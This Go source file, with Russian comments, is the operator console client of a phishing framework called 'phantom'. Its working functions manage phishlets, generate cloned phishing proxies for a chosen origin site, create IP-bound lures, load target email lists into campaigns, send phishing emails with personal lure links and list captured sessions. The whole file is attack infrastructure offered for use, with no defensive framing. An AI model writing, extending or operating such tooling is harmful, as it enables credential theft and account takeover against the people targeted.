// Package menu — консольное TUI оператора (charm/bubbletea).
// `phantom -menu`: dashboard, фишлеты, smart-lures, блокировки,
// reload/upsert/generate — поверх stealth API + локальный validate/gen.
package menu

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// Client — stealth API клиент для меню.
type Client struct {
	Base    string // http://127.0.0.1:8080
	Stealth string
	Token   string
	HTTP    *http.Client
}

func (c *Client) http() *http.Client {
	if c.HTTP != nil {
		return c.HTTP
	}
	return &http.Client{Timeout: 15 * time.Second}
}

func (c *Client) req(method, path string, body io.Reader) (*http.Request, error) {
	r, err := http.NewRequest(method, strings.TrimSuffix(c.Base, "/")+path, body)
	if err != nil {
		return nil, err
	}
	r.Header.Set("X-Stealth-Host", c.Stealth)
	if c.Token != "" {
		r.Header.Set("Authorization", "Bearer "+c.Token)
	}
	return r, nil
}

func (c *Client) doJSON(method, path string, body io.Reader, out any) (int, error) {
	r, err := c.req(method, path, body)
	if err != nil {
		return 0, err
	}
	resp, err := c.http().Do(r)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 1024))
		return resp.StatusCode, fmt.Errorf("api %d: %s", resp.StatusCode, string(b))
	}
	if out != nil {
		if err := json.NewDecoder(resp.Body).Decode(out); err != nil {
			return resp.StatusCode, err
		}
	}
	return resp.StatusCode, nil
}

// Stats — /api/v1/stats.
func (c *Client) Stats() (map[string]any, error) {
	var out map[string]any
	_, err := c.doJSON(http.MethodGet, "/api/v1/stats", nil, &out)
	return out, err
}

// Phishlets — /api/v1/phishlets.
func (c *Client) Phishlets() ([]string, error) {
	var out []string
	_, err := c.doJSON(http.MethodGet, "/api/v1/phishlets", nil, &out)
	return out, err
}

// ServerConfig — /api/v1/config (без секретов).
func (c *Client) ServerConfig() (map[string]any, error) {
	var out map[string]any
	_, err := c.doJSON(http.MethodGet, "/api/v1/config", nil, &out)
	return out, err
}

// Block — /api/v1/block.
func (c *Client) Block(key, reason string) error {
	b, _ := json.Marshal(map[string]string{"key": key, "reason": reason})
	code, err := c.doJSON(http.MethodPost, "/api/v1/block", strings.NewReader(string(b)), nil)
	if err != nil {
		return err
	}
	if code != http.StatusNoContent {
		return fmt.Errorf("block: status %d", code)
	}
	return nil
}

// SmartLure — /api/v1/lures.
func (c *Client) SmartLure(path, phishlet string, ttlMin, maxUses int, boundIP string, challenge bool) error {
	b, _ := json.Marshal(map[string]any{
		"path": path, "phishlet_id": phishlet, "ttl_min": ttlMin,
		"max_uses": maxUses, "bound_ip": boundIP, "require_challenge": challenge,
	})
	code, err := c.doJSON(http.MethodPost, "/api/v1/lures", strings.NewReader(string(b)), nil)
	if err != nil {
		return err
	}
	if code != http.StatusCreated {
		return fmt.Errorf("lure: status %d", code)
	}
	return nil
}

// Reload — /api/v1/phishlets/reload.
func (c *Client) Reload() error {
	code, err := c.doJSON(http.MethodPost, "/api/v1/phishlets/reload", nil, nil)
	if err != nil {
		return err
	}
	if code != http.StatusNoContent {
		return fmt.Errorf("reload: status %d", code)
	}
	return nil
}

// Upsert — /api/v1/phishlets (raw YAML).
func (c *Client) Upsert(yml string) (string, error) {
	r, err := c.req(http.MethodPost, "/api/v1/phishlets", strings.NewReader(yml))
	if err != nil {
		return "", err
	}
	r.Header.Set("Content-Type", "text/yaml")
	resp, err := c.http().Do(r)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	if resp.StatusCode != http.StatusCreated {
		return "", fmt.Errorf("upsert %d: %s", resp.StatusCode, string(b))
	}
	return string(b), nil
}

// Generate — /api/v1/phishlets/generate.
func (c *Client) Generate(origin, domain, id string) (string, error) {
	b, _ := json.Marshal(map[string]string{"origin": origin, "domain": domain, "id": id})
	r, err := c.req(http.MethodPost, "/api/v1/phishlets/generate", strings.NewReader(string(b)))
	if err != nil {
		return "", err
	}
	resp, err := c.http().Do(r)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	out, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode != 200 {
		return "", fmt.Errorf("generate %d: %s", resp.StatusCode, string(out))
	}
	return string(out), nil
}

// SetPhishlet — домены и/или вкл/выкл фишлета (nil = не менять).
// PUT /api/v1/phishlets/{id} -> 204, изменения персистятся на сервере.
func (c *Client) SetPhishlet(id string, domains []string, enabled *bool) error {
	b, _ := json.Marshal(map[string]any{"domains": domains, "enabled": enabled})
	r, err := c.req(http.MethodPut, "/api/v1/phishlets/"+id, strings.NewReader(string(b)))
	if err != nil {
		return err
	}
	resp, err := c.http().Do(r)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusNoContent {
		out, _ := io.ReadAll(io.LimitReader(resp.Body, 1024))
		return fmt.Errorf("phishlet %d: %s", resp.StatusCode, string(out))
	}
	return nil
}

// PhishletInfo — строка detail (id/enabled/domains) для пикеров.
type PhishletInfo struct {
	ID      string   `json:"id"`
	Enabled bool     `json:"enabled"`
	Domains []string `json:"domains"`
}

// PhishletsDetail — /api/v1/phishlets/detail.
func (c *Client) PhishletsDetail() ([]PhishletInfo, error) {
	var out []PhishletInfo
	_, err := c.doJSON(http.MethodGet, "/api/v1/phishlets/detail", nil, &out)
	return out, err
}

// ListDomains — /api/v1/domains.
func (c *Client) ListDomains() ([]string, error) {
	var out []string
	_, err := c.doJSON(http.MethodGet, "/api/v1/domains", nil, &out)
	if out == nil {
		out = []string{}
	}
	return out, err
}

// AddDomain — POST preset.
func (c *Client) AddDomain(domain string) error {
	b, _ := json.Marshal(map[string]string{"domain": domain})
	code, err := c.doJSON(http.MethodPost, "/api/v1/domains", strings.NewReader(string(b)), nil)
	if err != nil {
		return err
	}
	if code != http.StatusCreated {
		return fmt.Errorf("domains: status %d", code)
	}
	return nil
}

// RemoveDomain — DELETE preset.
func (c *Client) RemoveDomain(domain string) error {
	r, err := c.req(http.MethodDelete, "/api/v1/domains/"+domain, nil)
	if err != nil {
		return err
	}
	resp, err := c.http().Do(r)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusNoContent {
		return fmt.Errorf("domains: status %d", resp.StatusCode)
	}
	return nil
}

// CampInfo — строка списка кампаний со статистикой.
type CampInfo struct {
	ID        string `json:"id"`
	Name      string `json:"name"`
	Phishlet  string `json:"phishlet"`
	Status    string `json:"status"`
	Sent      int    `json:"sent"`
	Opened    int    `json:"opened"`
	Clicked   int    `json:"clicked"`
	Submitted int    `json:"submitted"`
	Total     int    `json:"total"`
}

// CampTarget — персональная приманка цели.
type CampTarget struct {
	Email string `json:"email"`
	Lure  string `json:"lure"`
}

// ListCampaigns — GET /api/v1/campaigns.
func (c *Client) ListCampaigns() ([]CampInfo, error) {
	var out []CampInfo
	_, err := c.doJSON(http.MethodGet, "/api/v1/campaigns", nil, &out)
	if out == nil {
		out = []CampInfo{}
	}
	return out, err
}

// CreateCampaign — POST -> id. endsAt unix, 0 = бессрочно.
func (c *Client) CreateCampaign(name, phishlet string, ttlMin, maxUses int, endsAt int64) (string, error) {
	b, _ := json.Marshal(map[string]any{"name": name, "phishlet_id": phishlet, "ttl_min": ttlMin, "max_uses": maxUses, "ends_at": endsAt})
	var out map[string]string
	code, err := c.doJSON(http.MethodPost, "/api/v1/campaigns", strings.NewReader(string(b)), &out)
	if err != nil {
		return "", err
	}
	if code != http.StatusCreated || out["id"] == "" {
		return "", fmt.Errorf("campaigns: status %d", code)
	}
	return out["id"], nil
}

// AddTargets — POST emails -> added.
func (c *Client) AddTargets(id string, emails []string) (int, error) {
	b, _ := json.Marshal(map[string]any{"emails": emails})
	var out map[string]int
	_, err := c.doJSON(http.MethodPost, "/api/v1/campaigns/"+id+"/targets", strings.NewReader(string(b)), &out)
	return out["added"], err
}

// LaunchCampaign — POST launch -> персональные lures.
func (c *Client) LaunchCampaign(id string) ([]CampTarget, error) {
	var out struct {
		Targets []CampTarget `json:"targets"`
	}
	_, err := c.doJSON(http.MethodPost, "/api/v1/campaigns/"+id+"/launch", nil, &out)
	return out.Targets, err
}

// SendCampaign — POST send -> sent.
func (c *Client) SendCampaign(id, subject, body, urlBase string) (int, error) {
	b, _ := json.Marshal(map[string]string{"subject": subject, "body": body, "url_base": urlBase})
	var out map[string]int
	_, err := c.doJSON(http.MethodPost, "/api/v1/campaigns/"+id+"/send", strings.NewReader(string(b)), &out)
	return out["sent"], err
}

// HostCheck — строка проверки origin-хоста.
type HostCheck struct {
	Host   string   `json:"host"`
	HTTP   int      `json:"http"`
	Bytes  int      `json:"bytes"`
	Hits   []string `json:"hits"`
	Misses []string `json:"misses"`
	Err    string   `json:"error"`
}

// CheckPhishlet — POST /api/v1/phishlets-check/{id}.
func (c *Client) CheckPhishlet(id string) ([]HostCheck, error) {
	var out []HostCheck
	_, err := c.doJSON(http.MethodPost, "/api/v1/phishlets-check/"+id, nil, &out)
	if out == nil {
		out = []HostCheck{}
	}
	return out, err
}

// CaptureRow — факт захвата для витрины.
type CaptureRow struct {
	Session string `json:"session"`
	Kind    string `json:"kind"`
	Node    string `json:"node"`
}

// Captures — GET /api/v1/captures.
func (c *Client) Captures() ([]CaptureRow, error) {
	var out []CaptureRow
	_, err := c.doJSON(http.MethodGet, "/api/v1/captures?limit=20", nil, &out)
	if out == nil {
		out = []CaptureRow{}
	}
	return out, err
}
